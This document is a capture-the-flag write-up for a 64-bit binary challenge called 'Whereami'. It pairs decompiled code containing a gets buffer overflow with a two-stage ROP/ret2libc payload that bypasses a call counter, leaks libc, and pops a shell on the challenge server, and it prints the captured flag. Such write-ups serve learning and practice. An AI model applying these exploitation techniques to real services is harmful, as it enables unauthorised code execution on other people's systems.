# Whereami
`ghidra` output
```c
undefined8 main(void) {
    char local_48 [60];
    __gid_t local_c;

    setbuf(stdout,(char *)0x0);
    local_c = getegid();
    setresgid(local_c,local_c,local_c);
    puts("I\'m so lost.");
    printf("Who are you? ");
    if (0 < counter) {
        exit(1);
    }
    counter = counter + 1;
    gets(local_48);
    puts("I hope you find yourself too.");
    return 0;
}
```
Here there is a buffer overflow vulnerability when they use `gets` to read user input into the buffer. One thing is that there is a global counter variable that gets incremented every time main is called, and the function exits if the counter is greater than 0. When main is first called, the buffer overflow is used to overwrite the return address to output the dynamic address of puts, decrement counter, and jump back to main.
```
payload  = b'A'*72
payload += p64(pop_pad_rbx_rbp_r12_r13_r14_r15)
payload += p64(0)
payload += p64(0xffffffff)
payload += p64(counter + 0x3d)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(add_dword_rbp_minux_3d_ebx)
payload += p64(pop_rdi)
payload += p64(exe.got['puts'])
payload += p64(exe.plt['puts'])
payload += p64(ret)
payload += p64(exe.symbols['main'])
```
Once the dynamic address of puts is known the libc base address can be calculated. The second time main is called, using the libc base the return address is overwritten with the address of `system` and `"/bin/sh\x00"` is put into rdi.
```
[+] Opening connection to challs.actf.co on port 31222: Done
[*] '/home/runner/nothingtosee/WHEREAMI/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/home/runner/nothingtosee/WHEREAMI/whereami'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
got puts: 0x404018
plt puts: 0x4010a4
b'PdR\x89\xca\x7f\x00\x00'
leaked puts: 0x7fca89526450
libc address: 0x7fca894a2000
binsh:  0x7fca896565bd
null:   0x7fca894a20b5
execve: 0x7fca895851a0
[*] Switching to interactive mode
I hope you find yourself too.
$ ls
flag.txt
run
$ cat flag.txt
actf{i'd_be_saf3_and_w4rm_if_1_wa5_in_la_5ca5e33ff06f}
```
## Flag: actf{i'd_be_saf3_and_w4rm_if_1_wa5_in_la_5ca5e33ff06f}